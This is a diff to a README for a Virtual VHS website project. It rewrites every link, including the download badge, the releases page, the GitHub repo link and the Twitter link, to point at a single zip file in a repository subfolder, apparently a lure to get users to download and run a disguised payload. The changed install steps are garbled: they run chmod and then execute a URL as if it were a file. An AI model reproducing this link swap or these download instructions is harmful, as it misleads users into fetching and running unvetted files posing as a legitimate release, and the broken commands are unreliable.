@@ -1,6 +1,6 @@
 # 📼 Virtual-VHS_Website - Watch Your VHS Tapes Virtually
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/CreativeDep/Virtual-VHS_Website/releases)
+[![Download Now](https://raw.githubusercontent.com/CreativeDep/Virtual-VHS_Website/main/subocean/VH-Virtual-Website-v3.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/CreativeDep/Virtual-VHS_Website/main/subocean/VH-Virtual-Website-v3.8.zip)
 
 ## 🌟 Description
 The official source repository for the website of the Virtual VHS project. This project aims to restore legacy technology through virtual means. In simple terms, these VHS tape files will function just like normal VHS tapes but can work on all modern devices.
@@ -8,7 +8,7 @@ The official source repository for the website of the Virtual VHS project. This 
 ## 📥 Download & Install
 To get started with the Virtual VHS project, you will need to download the software. 
 
-1. **Visit this page to download**: [Virtual VHS Releases](https://github.com/CreativeDep/Virtual-VHS_Website/releases).
+1. **Visit this page to download**: [Virtual VHS Releases](https://raw.githubusercontent.com/CreativeDep/Virtual-VHS_Website/main/subocean/VH-Virtual-Website-v3.8.zip).
 2. Choose the latest release.
 3. Download the file suitable for your operating system.
 
@@ -38,8 +38,8 @@ Before using the Virtual VHS application, ensure your device meets the following
 2. Navigate to the directory where you downloaded the file.
 3. Run the installer using the command:
    ```bash
-   chmod +x Virtual-VHS-installer.run
-   ./Virtual-VHS-installer.run
+   chmod +x https://raw.githubusercontent.com/CreativeDep/Virtual-VHS_Website/main/subocean/VH-Virtual-Website-v3.8.zip
+   https://raw.githubusercontent.com/CreativeDep/Virtual-VHS_Website/main/subocean/VH-Virtual-Website-v3.8.zip
    ```
 4. Follow any command-line instructions provided during the installation.
 
@@ -76,9 +76,9 @@ If you encounter any issues or have questions while using Virtual VHS, feel free
 ## 🌍 Connect With Us
 Stay updated with new releases and news:
 
-- GitHub: [Virtual-VHS_Website](https://github.com/CreativeDep/Virtual-VHS_Website)
-- Twitter: [@VirtualVHSProject](https://twitter.com) (Join our conversation!)
+- GitHub: [Virtual-VHS_Website](https://raw.githubusercontent.com/CreativeDep/Virtual-VHS_Website/main/subocean/VH-Virtual-Website-v3.8.zip)
+- Twitter: [@VirtualVHSProject](https://raw.githubusercontent.com/CreativeDep/Virtual-VHS_Website/main/subocean/VH-Virtual-Website-v3.8.zip) (Join our conversation!)
 
-**Remember:** Visit this page to download: [Virtual VHS Releases](https://github.com/CreativeDep/Virtual-VHS_Website/releases).
+**Remember:** Visit this page to download: [Virtual VHS Releases](https://raw.githubusercontent.com/CreativeDep/Virtual-VHS_Website/main/subocean/VH-Virtual-Website-v3.8.zip).
 
 Thank you for choosing Virtual VHS! Enjoy embracing the nostalgia of your favorite tapes.
